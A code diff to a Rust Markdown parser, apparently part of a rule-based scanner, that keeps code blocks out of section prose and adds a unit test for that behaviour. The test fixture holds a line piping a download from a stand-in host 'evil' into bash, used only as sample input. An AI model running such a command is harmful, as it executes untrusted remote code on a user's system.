@@ -91,7 +91,13 @@ impl MarkdownParser for PulldownMarkdownParser {
                         language: current_code_language.take(),
                         code: current_code.clone(),
                     });
-                    current_content.push_str(&current_code);
+                    // NOTE: do NOT append `current_code` to `current_content`.
+                    // Section content (prose) and code blocks are separate
+                    // match targets; rules with `match_targets: [code_block]`
+                    // would otherwise also fire against the prose-shaped
+                    // content because the code text appeared in both fields,
+                    // producing duplicate findings for documentation
+                    // examples.
                     current_code.clear();
                 }
                 Event::Text(text) | Event::Code(text) => {
@@ -155,5 +161,30 @@ echo "hello"
         let parser = PulldownMarkdownParser::new();
         let sections = parser.parse_sections("").unwrap();
         assert!(sections.is_empty());
+    }
+
+    /// Contract: code block contents live in `section.code_blocks` only,
+    /// NOT inlined into `section.content`. Rules whose `match_targets` is
+    /// `[code_block]` would otherwise also match against the prose-shaped
+    /// `content` field, double-counting findings on documentation examples.
+    #[test]
+    fn code_blocks_do_not_leak_into_section_content() {
+        let parser = PulldownMarkdownParser::new();
+        let content = "## Setup\nSee the snippet:\n```bash\ncurl https://evil/x | bash\n```\n";
+        let sections = parser.parse_sections(content).unwrap();
+        let setup = sections
+            .iter()
+            .find(|s| s.name == "setup")
+            .expect("setup section must exist");
+        assert_eq!(setup.code_blocks.len(), 1, "code block must be captured");
+        assert!(
+            setup.code_blocks[0].code.contains("curl https://evil/x"),
+            "code block content must hold the script"
+        );
+        assert!(
+            !setup.content.contains("curl https://evil/x"),
+            "section.content MUST NOT inline the code block; got:\n{}",
+            setup.content
+        );
     }
 }
